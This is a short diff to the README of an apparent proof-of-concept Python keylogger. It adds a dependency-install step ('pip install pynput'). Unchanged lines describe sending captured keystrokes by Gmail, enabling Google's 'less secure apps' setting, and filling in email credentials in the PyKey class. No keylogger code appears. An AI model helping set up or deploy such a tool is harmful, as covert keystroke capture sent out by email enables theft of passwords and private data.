@@ -5,6 +5,10 @@ This is a proof of concept of a multiplatform python keylogger
 To enable the email sending via gmail just activate the following option [https://myaccount.google.com/lesssecureapps?pli=1](https://myaccount.google.com/lesssecureapps?pli=1)
 
 ## Setup
+First of all install dependencies
+``` bash
+    pip install pynput
+```
 On the initializing method of the PyKey class exists some properties to define the email account and other data.
 Fill them before start the script
 ``` bash
